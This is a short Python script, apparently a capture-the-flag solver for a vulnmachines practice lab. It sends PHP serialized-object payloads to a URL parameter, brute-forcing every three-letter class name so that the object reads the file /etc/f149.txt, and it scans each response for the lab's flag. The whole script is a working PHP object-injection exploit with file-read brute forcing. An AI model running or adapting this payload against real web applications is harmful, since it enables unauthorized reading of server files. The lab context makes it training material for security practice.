#!/usr/bin/env python3
import requests
import urllib.parse
import re
from itertools import product
import string

base_url = "http://hackme11.vulnmachines.com:8056"

print("[*] Testing ALL 3-letter class names")

# Generar TODAS las combinaciones de 3 letras
count = 0
for c1, c2, c3 in product(string.ascii_letters, repeat=3):
    name = c1 + c2 + c3
    count += 1
    
    if count % 1000 == 0:
        print(f"    Tested {count} combinations...")
    
    payload = f'O:3:"{name}":1:{{s:4:"file";s:13:"/etc/f149.txt";}}'
    encoded = urllib.parse.quote(payload)
    url = f"{base_url}/params?vnm={encoded}"
    
    try:
        r = requests.get(url, timeout=0.3)
        if 'vulnmachines{' in r.text.lower():
            print(f"\n[!!!] FOUND CLASS: {name}")
            matches = re.findall(r'vulnmachines\{[^}]+\}', r.text, re.IGNORECASE)
            if matches:
                print(f"[!!!] FLAG: {matches[0]}")
            exit(0)
    except:
        pass

print(f"\n[-] Tested {count} 3-letter combinations, no flag found")